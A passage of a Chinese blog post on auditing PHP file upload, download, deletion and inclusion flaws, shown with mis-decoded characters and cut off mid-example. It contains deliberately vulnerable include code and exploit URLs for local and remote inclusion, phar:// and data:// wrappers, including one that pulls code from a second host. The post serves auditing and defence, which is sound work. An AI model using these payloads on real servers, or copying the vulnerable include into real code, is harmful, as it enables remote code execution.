    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ–‡ä»¶ç±»å‹æ¼æ´ï¼Œåˆ†ä¸ºå››ç§ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸‹è½½ï¼Œæ–‡ä»¶åˆ é™¤ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h2 id="0x01-æ–‡ä»¶ä¸Šä¼ "><a href="#0x01-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x01 æ–‡ä»¶ä¸Šä¼ "></a>0x01 æ–‡ä»¶ä¸Šä¼ </h2><h3 id="1-æ¼æ´æ¦‚è¿°"><a href="#1-æ¼æ´æ¦‚è¿°" class="headerlink" title="1.æ¼æ´æ¦‚è¿°"></a>1.æ¼æ´æ¦‚è¿°</h3><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ˜¯å°†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡æ­¤è„šæœ¬åœ¨æœåŠ¡ç«¯æ‰§è¡Œå‘½ä»¤ï¼Œè·å– webshellï¼Œè¯¥æ¼æ´å±å®³å·¨å¤§ï¼ŒåŸå› æ˜¯å¼€å‘è€…ï¼Œæ²¡æœ‰ä¸Šä¼ æ–‡ä»¶çš„è¿›è¡Œç›¸å…³çš„å®‰å…¨æ£€æŸ¥ï¼Œæˆ–è€…æ£€æŸ¥çš„ä¸å®Œæ•´ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯¹åº”ç›¸å…³ä¸šåŠ¡åœºæ™¯ï¼Œä¸Šä¼ é™„ä»¶ï¼Œå¤´åƒç­‰</p><p>æ–‡ä»¶ä¸Šä¼ ç»†åˆ†ä¸ºå››ç±»</p><ul><li>ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚åœ¨ä¸Šä¼ åŠŸèƒ½å¤„ï¼Œæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å¯ä»¥è·å¾—webshellæƒé™ã€‚</li><li>å‰ç«¯æ ¡éªŒæ¼æ´ã€‚åœ¨ä¸Šä¼ åŠŸèƒ½å¤„ï¼Œæœ‰æ£€éªŒæ–‡ä»¶æ‰©å±•åï¼Œæˆ–è€…ä»¥ç™½åå•ï¼Œé»‘åå•çš„å½¢å¼è¿‡æ»¤ï¼Œjsæ£€æµ‹ä¸ä¸¥è°¨ï¼Œä½¿ç”¨æŠ“åŒ…å·¥å…·ï¼Œç›´æ¥ç»•è¿‡ï¼Œç›¸å½“äºæ²¡æœ‰ã€‚</li><li>åç«¯æ ¡éªŒæ¼æ´ã€‚å¸¸è§åç«¯æ ¡éªŒæœ‰MIMEç±»å‹æ£€æµ‹ï¼Œç›®å½•è·¯å¾„æ£€æµ‹ã€æ–‡ä»¶æ‰©å±•åæ£€æµ‹ã€æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼Œå¦‚æœè®¾ç½®ä¸å½“ï¼Œä¹Ÿä¼šé€ æˆæ¼æ´ã€‚</li><li>è§£ææ¼æ´ã€‚æŒ‡ Web æœåŠ¡å¯¹ HTTP è¯·æ±‚å¤„ç†ä¸å½“ï¼Œå¯¼è‡´å°†ä¸èƒ½æ‰§è¡Œçš„è„šæœ¬ã€æ–‡ä»¶ï¼Œå½“åšå¯ä»¥æ‰§è¡Œçš„è„šæœ¬ï¼Œæ–‡ä»¶ç­‰ã€‚è¯¥æ¼æ´ä¸€èˆ¬é…åˆæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®ç°ï¼Œå…·ä½“çš„è¦çœ‹ä¸­é—´ä»¶è§£ææ¼æ´ï¼Œå¦‚IISã€Apacheã€nginx ç­‰ã€‚</li></ul><p>å…·ä½“çš„ç»•è¿‡æ–¹å¼ï¼Œå¯æ­å»ºå¯¹åº”çš„é¶åœºè¿›è¡Œå¤ç°ï¼Œæ·±å…¥ç†è§£åŸç†åŠå„ç§ä¸Šä¼ å§¿åŠ¿ <a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p><p>è¿™æ˜¯é¶åœºæ€»ç»“çš„æ€ç»´å¯¼å›¾</p><p><img src="/2021/2734680967/mind-map.png" alt="mind-map.png"> </p><h3 id="2-å®¡è®¡æ€è·¯"><a href="#2-å®¡è®¡æ€è·¯" class="headerlink" title="2.å®¡è®¡æ€è·¯"></a>2.å®¡è®¡æ€è·¯</h3><p>æ—¢ç„¶æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œé‚£å°±åˆ¤æ–­å“ªäº›åœ°æ–¹å¯èƒ½å­˜åœ¨ä¸Šä¼ ç‚¹ï¼Œè‡ªå·±æ­å»ºå¯¹åº”çš„ç¯å¢ƒï¼Œåˆ†æå¯èƒ½å­˜åœ¨ä¸Šä¼ çš„ç‚¹ï¼Œç„¶ååˆ†æå±å®³ç¨‹åº¦ï¼ˆæ–‡ä»¶ä¸Šä¼ æ˜¯åœ¨æœ¬åœ°è¿˜æ˜¯è¿œç¨‹ï¼Œæ˜¯å¦å­˜åœ¨è„šæœ¬æ‰§è¡Œæˆ–è€…ç¯å¢ƒæ”¯æŒç­‰ï¼‰ï¼Œç„¶åè¿›è¡Œåˆ†æï¼Œæ–‡ä»¶æ ¡éªŒçš„åŠŸèƒ½æ˜¯å¦å®Œå–„ï¼Œå¯ä»ï¼Œå‰ç«¯js å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åè¿›è¡Œæ ¡éªŒï¼Œä»¥åŠåç«¯ï¼Œæ˜¯é»‘åå•ã€ç™½åå•ã€HTTP headerçš„Conten-typeï¼Œæ–‡ä»¶å¤´éªŒè¯ï¼ŒäºŒæ¬¡æ¸²æŸ“éªŒè¯å’Œæ–‡ä»¶åéšæœºåŒ–ç­‰ã€‚</p><p><img src="/2021/2734680967/sum_up.png" alt="sum_up.png"> </p><p>ç»¼ä¸Šæ‰€è¿°ï¼šå®¡è®¡çš„è¦ç‚¹ï¼Œæ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å‡½æ•°æœç´¢<code>$_FILES</code>ï¼Œæ‰¾åˆ°ä¸Šä¼ ç‚¹</p><p>ç„¶åæ ¹æ®ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥è¿›è¡Œä»¥ä¸‹æµç¨‹å®¡è®¡</p><ul><li>æ˜¯å¦æœ‰æ–‡ä»¶åç¼€åæ ¡éªŒ</li><li>æ˜¯å¦æœ‰æ–‡ä»¶å†…å®¹æ£€éªŒ</li><li>æ˜¯å¦æœ‰æ–‡ä»¶ç±»å‹æ£€éªŒ</li><li>æ–‡ä»¶ç±»å‹æ˜¯å¦æ ¡éªŒ</li><li>æ–‡ä»¶ä¸Šä¼ è·¯å¾„æ˜¯å¦æ ¡éªŒ</li><li>æ–‡ä»¶ç›®å½•æ˜¯å¦ç¦æ­¢è„šæœ¬è§£æ</li></ul><h3 id="3-é˜²å¾¡å»ºè®®"><a href="#3-é˜²å¾¡å»ºè®®" class="headerlink" title="3.é˜²å¾¡å»ºè®®"></a>3.é˜²å¾¡å»ºè®®</h3><ol><li>å¯¹ä¸Šä¼ æ–‡ä»¶ç±»å‹è¿›è¡ŒéªŒè¯ï¼Œé™¤åœ¨å‰ç«¯éªŒè¯å¤–åœ¨åç«¯ä¾ç„¶è¦åšéªŒè¯ï¼Œåç«¯å¯ä»¥è¿›è¡Œæ‰©å±•åæ£€æµ‹ï¼Œé‡å‘½åæ–‡ä»¶ï¼ŒMIMEç±»å‹æ£€æµ‹ä»¥åŠé™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ç­‰é™åˆ¶æ¥é˜²å¾¡ï¼Œæˆ–æ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶å…¶ä»–æ–‡ä»¶å­˜å‚¨æœåŠ¡å™¨ä¸­ã€‚</li><li>ä¸¥æ ¼é™åˆ¶å’Œæ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¦æ­¢ä¸Šä¼ æ¶æ„ä»£ç çš„æ–‡ä»¶ã€‚åŒæ—¶é™åˆ¶ç›¸å…³ä¸Šä¼ æ–‡ä»¶ç›®å½•çš„æ‰§è¡Œæƒé™ï¼Œé˜²æ­¢æœ¨é©¬æ‰§è¡Œã€‚</li><li>å¯¹ä¸Šä¼ æ–‡ä»¶æ ¼å¼è¿›è¡Œä¸¥æ ¼æ ¡éªŒï¼Œé˜²æ­¢ä¸Šä¼ æ¶æ„è„šæœ¬æ–‡ä»¶ï¼›</li><li>ä¸¥æ ¼é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ã€‚</li><li>æ–‡ä»¶æ‰©å±•åæœåŠ¡ç«¯ç™½åå•æ ¡éªŒã€‚</li><li>æ–‡ä»¶å†…å®¹æœåŠ¡ç«¯æ ¡éªŒã€‚</li><li>ä¸Šä¼ æ–‡ä»¶é‡å‘½åã€‚</li><li>éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„ã€‚</li></ol><h2 id="0x02-æ–‡ä»¶ä¸‹è½½"><a href="#0x02-æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x02 æ–‡ä»¶ä¸‹è½½"></a>0x02 æ–‡ä»¶ä¸‹è½½</h2><h3 id="1-æ¼æ´æ¦‚è¿°-1"><a href="#1-æ¼æ´æ¦‚è¿°-1" class="headerlink" title="1.æ¼æ´æ¦‚è¿°"></a>1.æ¼æ´æ¦‚è¿°</h3><p>æ–‡ä»¶ä¸‹è½½ä¹Ÿå«ç›®å½•ç©¿è¶Š/ç›®å½•éå†ï¼Œæ–‡ä»¶ä¸‹è½½æˆ–è·å–æ–‡ä»¶æ˜¾ç¤ºå†…å®¹é¡µé¢ç”±äºæœªå¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œè¿‡æ»¤ï¼Œåˆ©ç”¨è·¯å¾„å›æº¯ç¬¦<code>../</code>è·³å‡ºç¨‹åºæœ¬èº«çš„é™åˆ¶ç›®å½•ï¼Œæ¥ä¸‹è½½æˆ–æ˜¾ç¤ºä»»æ„æ–‡ä»¶ã€‚è¯¥æ¼æ´èƒ½ä¸‹è½½ï¼Œé…ç½®æ–‡ä»¶ï¼Œæ—¥å¿—ï¼Œæœ‰æƒé™ç®¡æ§çš„æ•æ„Ÿæ–‡ä»¶ç­‰ï¼Œ</p><p>æ¼æ´äº§ç”Ÿé€šå¸¸åœ¨æ–‡ä»¶æŸ¥çœ‹ï¼Œæ–‡ä»¶ä¸‹è½½åŠŸèƒ½ä¸­ã€‚</p><h3 id="2-å®¡è®¡æ€è·¯-1"><a href="#2-å®¡è®¡æ€è·¯-1" class="headerlink" title="2.å®¡è®¡æ€è·¯"></a>2.å®¡è®¡æ€è·¯</h3><p>åœ¨åˆ†æè¯¥æ¼æ´æˆ–è¿›è¡Œå®¡è®¡æ—¶ï¼Œé€šå¸¸ä½¿ç”¨<code>../</code>æ¥é€ä¸ªå±‚æ¶æŸ¥çœ‹æ¨æµ‹è·¯å¾„ä¿¡æ¯ï¼Œä»¥æœ€å¤§é™åº¦åœ°éå†æ‰€æœ‰å¯èƒ½è—åœ¨æ–‡ä»¶ä¸‹è½½æ¼æ´çš„éƒ¨åˆ†ï¼Œå¸¸ç”¨çš„å‡½æ•°æœ‰</p><ul><li>file_get_contents()</li><li>file()</li><li>readfile()</li><li>fread()</li><li>fgets()</li></ul><p>åœ¨CTFä¸­é€šå¸¸ä½¿ç”¨ php://filteræ¥æŸ¥çœ‹æºç ä¿¡æ¯</p><p>åˆæ­¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶ä¸‹è½½æ¼æ´</p><ul><li>å¯ä»¥ä¸‹è½½æˆ–è¯»æ–‡ä»¶çš„å‡½æ•°ä¸”å‚æ•°æ˜¯å¦å¯æ§</li><li>å¯ä»¥ä¸‹è½½æˆ–è¯»æ–‡ä»¶çš„è·¯å¾„æ˜¯å¦æœªæ ¡éªŒæˆ–æ ¡éªŒä¸ä¸¥è°¨</li><li>ä¸‹è½½æˆ–å¯è¯»çš„æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼Œæˆ–è€…è¯´æ˜èƒ½å¦çœ‹åˆ°æ–‡ä»¶çš„æºå†…å®¹</li></ul><p>å®¡è®¡çš„æ€è·¯ï¼Œé‡ç‚¹æ‰¾å‡½æ•°ï¼Œç„¶åè¿›è¡Œæ„é€ åˆ©ç”¨ï¼Œçœ‹æ¼æ´çš„å½±å“èŒƒå›´ã€‚</p><h3 id="2-é˜²å¾¡å»ºè®®"><a href="#2-é˜²å¾¡å»ºè®®" class="headerlink" title="2.é˜²å¾¡å»ºè®®"></a>2.é˜²å¾¡å»ºè®®</h3><p>å¯¹ä¼ å…¥çš„æ–‡ä»¶åå‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä¸”åˆ¤æ–­æ˜¯å¦æ˜¯å…è®¸è·å–çš„æ–‡ä»¶ç±»å‹ï¼Œè¿‡æ»¤å›æº¯ç¬¦../ã€‚</p><h2 id="0x03-æ–‡ä»¶åˆ é™¤"><a href="#0x03-æ–‡ä»¶åˆ é™¤" class="headerlink" title="0x03 æ–‡ä»¶åˆ é™¤"></a>0x03 æ–‡ä»¶åˆ é™¤</h2><h3 id="1-æ¼æ´æ¦‚è¿°-2"><a href="#1-æ¼æ´æ¦‚è¿°-2" class="headerlink" title="1.æ¼æ´æ¦‚è¿°"></a>1.æ¼æ´æ¦‚è¿°</h3><p>æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œå¯è®©æ”»å‡»è€…éšæ„åˆ é™¤æœåŠ¡å™¨ä¸Šçš„ä»»æ„æˆ–æŒ‡å®šæ–‡ä»¶ã€‚</p><p>æ¼æ´ç‚¹ï¼Œå‰ªè´´ï¼Œåˆ é™¤æ–‡ä»¶ï¼Œæ¸…é™¤æ–‡ä»¶ç­‰</p><h3 id="2-å®¡è®¡æ€è·¯-2"><a href="#2-å®¡è®¡æ€è·¯-2" class="headerlink" title="2.å®¡è®¡æ€è·¯"></a>2.å®¡è®¡æ€è·¯</h3><p>å‡½æ•°æœç´¢ï¼Œå…³é”®å‡½æ•°  <a href="https://www.php.net/manual/zh/function.unlink.php">unlink</a></p><p>åœ¨ JavaScriptä¸­æœç´¢ï¼Œfiel.deleteæˆ– deleteã€delFileã€delDirç­‰å‡½æ•°å…³é”®è¯ï¼Œå®šä½å…³é”®è¯ï¼Œåˆ†æå…³é”®ä½ç½®çš„ä¸Šä¸‹æ–‡ä»£ç ï¼Œé‡ç‚¹åˆ†ææ˜¯å¦å¯å­˜åœ¨å¯æ§æ–‡ä»¶å‚æ•°ï¼Œæ˜¯å¦æœ‰æ ¡éªŒæˆ–è€…æ ¡éªŒå¯ç»•è¿‡</p><h3 id="3-é˜²å¾¡å»ºè®®-1"><a href="#3-é˜²å¾¡å»ºè®®-1" class="headerlink" title="3.é˜²å¾¡å»ºè®®"></a>3.é˜²å¾¡å»ºè®®</h3><p>å¯¹unlink å‡½æ•°ï¼Œæˆ–è€…å¯èƒ½å­˜åœ¨åˆ é™¤æ–‡ä»¶çš„åœ°æ–¹ï¼Œè¿›è¡ŒåŠ å›º</p><h2 id="0x03-æ–‡ä»¶åŒ…å«"><a href="#0x03-æ–‡ä»¶åŒ…å«" class="headerlink" title="0x03 æ–‡ä»¶åŒ…å«"></a>0x03 æ–‡ä»¶åŒ…å«</h2><h3 id="1-æ¼æ´æ¦‚è¿°-3"><a href="#1-æ¼æ´æ¦‚è¿°-3" class="headerlink" title="1.æ¼æ´æ¦‚è¿°"></a>1.æ¼æ´æ¦‚è¿°</h3><p>æ–‡ä»¶åŒ…å«ï¼Œæ˜¯å°†æŒ‡å®šçš„åŒ…å«æˆ–å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶åµŒå…¥åˆ°ç¨‹åºç©ºé—´ï¼Œå¹¶ä¸”è¯¥å¼•å…¥çš„å‚æ•°ï¼Œç”¨æˆ·æ˜¯å¯æ§ä¸”æ²¡æœ‰å¯¹å…¶è¿›è¡Œå®‰å…¨æ ¡éªŒï¼Œå¯¼è‡´åŒ…å«æ¶æ„ä»£ç çš„æ–‡ä»¶åµŒå…¥åˆ°ç¨‹åºç©ºé—´å¹¶å¾—åˆ°è§£ææ‰§è¡Œï¼Œä»è€Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>PHP æ–‡ä»¶åŒ…å«å…³é”®å‡½æ•°</p><table><thead><tr><th>å‡½æ•°</th><th>æ¦‚è¿°</th></tr></thead><tbody><tr><td><a href="https://www.php.net/manual/zh/function.include.php">include</a></td><td>åŒ…å«å¤šæ¬¡</td></tr><tr><td>include_once</td><td>åŒ…å«ä¸€æ¬¡</td></tr><tr><td>require</td><td>åŒ…å«å¤šæ¬¡</td></tr><tr><td>require_once</td><td>åŒ…å«ä¸€æ¬¡</td></tr><tr><td><a href="https://www.php.net/manual/zh/function.file-get-contents">file_get_contents</a></td><td>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>fopen</td><td>æ‰“å¼€æ–‡ä»¶æˆ–è€… URL</td></tr><tr><td>file</td><td>æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­</td></tr><tr><td>readfile</td><td>è¾“å‡ºæ–‡ä»¶</td></tr></tbody></table><p>JavaScript åŒ…å«æ‰§è¡Œ</p><ul><li><code>include</code></li><li><code>jsp:include</code></li><li><code>c:import</code></li></ul><p>æ–‡ä»¶åŒ…å«åˆ†ä¸ºä¸‰ç§ï¼š</p><ul><li>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLocal File Includeï¼‰</li><li>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRemote File Includeï¼‰</li><li>PHPä¼ªåè®®</li></ul><p>å…¶ä¸­ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸€èˆ¬æ˜¯ä¸Šä¼ æˆ–æ—¥å¿—ç¼“å­˜ï¼Œå†™å…¥ç­‰æ–¹æ³•æ¥åŒ…å«æ¶æ„æ–‡ä»¶ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´æ˜¯å¼•å…¥è¿œç¨‹çš„æ¶æ„æ–‡ä»¶ï¼Œæ¶æ„ä»£ç ã€‚</p><h3 id="2-æœ¬åœ°æ–‡ä»¶åŒ…å«-LFI"><a href="#2-æœ¬åœ°æ–‡ä»¶åŒ…å«-LFI" class="headerlink" title="2.æœ¬åœ°æ–‡ä»¶åŒ…å« LFI"></a>2.æœ¬åœ°æ–‡ä»¶åŒ…å« LFI</h3><p>åŒ…å«æœ¬åœ°æœåŠ¡å™¨çš„æ–‡ä»¶ä¸”èƒ½æ­£å¸¸æ‰§è¡Œè¢«åŒ…å«æ–‡ä»¶çš„ä»£ç å°±æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«</p><p>æ¡ˆä¾‹ï¼šæ™®é€šæœ¬åœ°åŒ…å«æ¼æ´</p><p>æ–°å»ºtest.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»º test.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=test.txt</span></span><br></pre></td></tr></table></figure><p><img src="/2021/2734680967/image-20211219170025799.png" alt="image-20211219170025799"> </p><p>test.php ä»£ç ä¸­ï¼Œinclude ä½¿ç”¨ GET ç±»å‹æ¥æ”¶ç”¨æˆ·çš„æ–‡ä»¶ï¼Œè¿›è¡ŒåŒ…å«ï¼Œæˆ‘ä»¬åœ¨è¯¥ç›®å½•ä¸‹ï¼Œåˆ›å»ºäº†ä¸€ä¸ª test.txt æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼ å…¥äº†æ–‡ä»¶çš„åå­—ï¼Œç„¶åä»£ç æ‰§è¡Œå°† test.txt åŒ…å«åœ¨ test.php ä»£ç ä¸­æ‰§è¡Œäº†ä»£ç ã€‚è§¦å‘äº†æ¶æ„ä»£ç ã€‚</p><h3 id="3-è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#3-è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="3.è¿œç¨‹æ–‡ä»¶åŒ…å« RFI"></a>3.è¿œç¨‹æ–‡ä»¶åŒ…å« RFI</h3><p>åœ¨è¿œç¨‹åŒ…å«éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>php.iniä¸­çš„ <code>allow_url_fopen</code>å’Œ<code>allow_url_include</code>éƒ½ä¸º On ï¼Œä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ï¼Œéœ€è¦é‡å¯æœåŠ¡</li></ul><p><img src="/2021/2734680967/image-20211219172537874.png" alt="image-20211219172537874"> </p><ul><li>è¢«åŒ…å«æ–‡ä»¶æ²¡æœ‰ç›®å½•é™åˆ¶ï¼Œæˆ–å¯æ§çš„æ–‡ä»¶ï¼Œæ¶æ„ä»£ç ï¼Œæ•°æ®æµå¯è¢«å¼•å…¥è§£æ</li></ul><p>ç¬¦åˆä»¥ä¸Šæ¡ä»¶å°±æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</p><p>æ¡ˆä¾‹ï¼šæ™®é€šè¿œç¨‹æ–‡ä»¶åŒ…å«</p><p>è¿œç¨‹æœåŠ¡å™¨ä¸Šå»ºç«‹ test3.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;å­˜åœ¨è¿œç¨‹åŒ…å«æ¼æ´&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°æœåŠ¡å™¨ä¸Šå»ºç«‹ test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®åœ°å€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test3.php?file=http://192.168.1.105/test3.txt</span></span><br></pre></td></tr></table></figure><p><img src="/2021/2734680967/image-20211219173401170.png" alt="image-20211219173401170"> </p><p>æ¼æ´åˆ†æ</p><p>å’Œæœ¬åœ°åŒ…å«ç±»ä¼¼ï¼Œåªæ˜¯æŠŠè®¿é—®åœ°å€æ”¹æˆäº†è¿œç¨‹åœ°å€ï¼Œç„¶åè§¦å‘äº†æ¼æ´</p><h3 id="4-PHP-ä¼ªåè®®"><a href="#4-PHP-ä¼ªåè®®" class="headerlink" title="4.PHP ä¼ªåè®®"></a>4.PHP ä¼ªåè®®</h3><p>PHPå°è£…åè®®åˆå«ä¼ªåè®®ï¼Œæ­¤ç§ç±»å‹ç»å¸¸åœ¨CTFä¸­ç”¨åˆ°ã€‚</p><ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> â€” è®¿é—® HTTP(s) ç½‘å€</li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> â€” è®¿é—® FTP(s) URLs</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> â€” å‹ç¼©æµ</li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> â€” PHP å½’æ¡£</li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> â€” Secure Shell 2</li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> â€” RAR</li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> â€” éŸ³é¢‘æµ</li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> â€” å¤„ç†äº¤äº’å¼çš„æµ</li></ul><p>æœ‰çš„åè®®å—é™åˆ¶ï¼Œallow_url_fopen å’Œ allow_url_include çš„é™åˆ¶</p><p><img src="/2021/2734680967/webp.webp" alt="img"> </p><p>ä¸€èˆ¬åœ¨PHPåç¼€åå­˜åœ¨é™åˆ¶ä¸”å¤šç§é˜¶æ®µæ–¹å¼æ— æ³•ç”Ÿæ•ˆæ—¶ï¼Œå¯ä½¿ç”¨ PHP ä¼ªåè®®æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h4 id="4-1-phar-åè®®åˆ©ç”¨"><a href="#4-1-phar-åè®®åˆ©ç”¨" class="headerlink" title="4.1 phar:// åè®®åˆ©ç”¨"></a>4.1 phar:// åè®®åˆ©ç”¨</h4><p>æ–°å»º test1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†test1.txt æ–‡ä»¶å‹ç¼©å­˜å‚¨ä¸ºtest1.zip é€šè¿‡æµè§ˆå™¨è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test1.php?file=phar://test1.zip/test1.txt</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡phar://åè®®è¯»å–test1.zip å‹ç¼©åŒ…é‡Œçš„test1.txt çš„åŸå§‹å†…å®¹å³å¹¶è§£ææ‰§è¡Œï¼Œè§¦å‘æ¶æ„ä»£ç </p><p><img src="/2021/2734680967/image-20211219184700210.png" alt="image-20211219184700210"> </p><h4 id="4-2-data-åè®®"><a href="#4-2-data-åè®®" class="headerlink" title="4.2 data:// åè®®"></a>4.2 data:// åè®®</h4><p>åœ¨æœ¬åœ°æœåŠ¡å™¨æ–°å»º test11.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æµè§ˆå™¨è®¿é—®è·¯å¾„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test11.php?file=data://text/plain;base64,PD9waHAKIHBocGluZm8oKTsKPz4=</span></span><br></pre></td></tr></table></figure><p><img src="/2021/2734680967/image-20211219185739250.png" alt="image-20211219185739250"> </p><p>ä½¿ç”¨base64 è¿›è¡Œç¼–ç æˆä¸ºæ•°æ®æµçš„</p><p><img src="/2021/2734680967/image-20211219185821830.png" alt="image-20211219185821830"> </p><h4 id="4-3-php-input-åè®®"><a href="#4-3-php-input-åè®®" class="headerlink" title="4.3 php://input åè®®"></a>4.3 php://input åè®®</h4><p>æ–°å»º test12.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 